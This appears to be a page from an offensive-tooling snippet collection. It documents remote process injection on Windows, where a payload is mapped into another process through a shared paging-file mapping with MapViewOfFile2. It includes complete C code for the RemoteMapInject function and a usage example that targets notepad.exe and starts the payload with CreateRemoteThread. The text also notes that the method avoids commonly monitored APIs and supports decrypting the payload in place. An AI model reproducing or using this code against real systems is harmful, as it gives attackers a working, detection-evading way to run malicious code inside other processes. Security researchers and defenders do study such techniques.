## Remote Mapping Injection via MapViewOfFile2

Injects a payload into a remote process using mapped memory instead of `VirtualAllocEx`/`WriteProcessMemory`. Creates a file mapping object backed by the system paging file with `CreateFileMapping`, maps a local writable view with `MapViewOfFile` using `FILE_MAP_WRITE`, copies the payload into the local view with `memcpy`, then maps the same file mapping object directly into the remote process's address space with `MapViewOfFile2` using `PAGE_EXECUTE_READWRITE`. Because both views share the same file mapping handle, any modification to the local view is reflected in the remote view — including in-place decryption of an encrypted payload after mapping. Returns the remote mapped base address to the caller.

⚠️ Do not call `UnmapViewOfFile` on the local view while the payload is still executing in the remote process — the remote view is a reflection of the local one and unmapping locally will crash the remote process.

**Usage**

Call `RemoteMapInject` with an open handle to the target process, the payload buffer, its size, and a pointer to receive the remote mapped address. On success `*ppAddress` holds the executable mapped region in the remote process ready to be passed to `CreateRemoteThread` or any remote execution primitive.

- `IN HANDLE hProcess`  Open handle to the target remote process. Must have `PROCESS_VM_OPERATION` access.
- `IN PBYTE pPayload`  Base address of the payload buffer to inject.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.
- `OUT PVOID* ppAddress`  Receives the base address of the mapped executable region in the remote process.

**Return Value**

`BOOL`  Returns `TRUE` if the payload was successfully mapped into the remote process, otherwise `FALSE`.

**External Files**

- `windows.h`  `BOOL`, `HANDLE`, `PBYTE`, `PVOID`, `SIZE_T`, `IN`, `OUT`, `CreateFileMapping()`, `MapViewOfFile()`, `MapViewOfFile2()`, `UnmapViewOfFile()`, `CloseHandle()`, `GetLastError()`

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "OneCore.lib")     // Required to link MapViewOfFile2.


BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL    bSTATE              = TRUE;
    HANDLE  hFile               = NULL;
    PVOID   pMapLocalAddress    = NULL,
            pMapRemoteAddress   = NULL;

    // Create a file mapping object backed by the system paging file.
    // PAGE_EXECUTE_READWRITE sets the maximum protection; the actual view
    // permissions are determined by the subsequent MapViewOfFile/2 calls.
    hFile = CreateFileMapping(
        INVALID_HANDLE_VALUE,   // Use paging file instead of a file on disk.
        NULL,                   // Default security attributes.
        PAGE_EXECUTE_READWRITE, // Maximum protection allowed for views of this mapping.
        NULL,                   // High-order DWORD of mapping size — not needed.
        sPayloadSize,           // Low-order DWORD of mapping size — payload size in bytes.
        NULL                    // No name for the mapping object.
    );
    if (hFile == NULL) {
        printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Map a local writable view — only FILE_MAP_WRITE is needed here
    // since the payload is not executed locally, only copied.
    pMapLocalAddress = MapViewOfFile(
        hFile,          // Handle to the file mapping object.
        FILE_MAP_WRITE, // Write access only — sufficient to copy the payload.
        NULL,           // High-order DWORD of file offset — not needed.
        NULL,           // Low-order DWORD of file offset — not needed.
        sPayloadSize    // Number of bytes to map — payload size.
    );
    if (pMapLocalAddress == NULL) {
        printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);

    printf("\t[#] Press <Enter> To Write The Payload ... ");
    getchar();

    // Copy the payload into the local mapped view.
    // Because both views share the same file mapping handle, this write
    // is immediately reflected in the remote view mapped below.
    printf("\t[i] Copying Payload To 0x%p ... ", pMapLocalAddress);
    memcpy(pMapLocalAddress, pPayload, sPayloadSize);
    printf("[+] DONE \n");

    // Map the same file mapping object into the remote process's address space.
    // The remote view is backed by the same pages as the local view, so the
    // payload copied above is immediately visible in the remote process.
    pMapRemoteAddress = MapViewOfFile2(
        hFile,                  // Handle to the file mapping object shared with MapViewOfFile.
        hProcess,               // Handle to the target remote process (PROCESS_VM_OPERATION).
        NULL,                   // Offset into the mapping — not needed.
        NULL,                   // Preferred base address in the remote process — let OS choose.
        NULL,                   // View size — 0 maps the entire mapping.
        NULL,                   // Allocation type — not needed.
        PAGE_EXECUTE_READWRITE  // Remote view protection: read, write, and execute.
    );
    if (pMapRemoteAddress == NULL) {
        printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
    // Return the remote mapped address to the caller.
    *ppAddress = pMapRemoteAddress;
    // Close the file mapping handle — both mapped views remain valid.
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL;
PVOID   pAddress    = NULL;
DWORD   dwProcessId = NULL;

// Open a handle to the target process — must include PROCESS_VM_OPERATION.
GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess);

// Inject the payload via mapped memory and get the remote base address.
RemoteMapInject(hProcess, pPayload, sPayloadSize, &pAddress);

// Execute the payload in the remote process.
CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);

// Unmap the local view only after the payload has finished executing.
// Unmapping while the payload is still running will crash the remote process.
// UnmapViewOfFile(pLocalAddress);
```
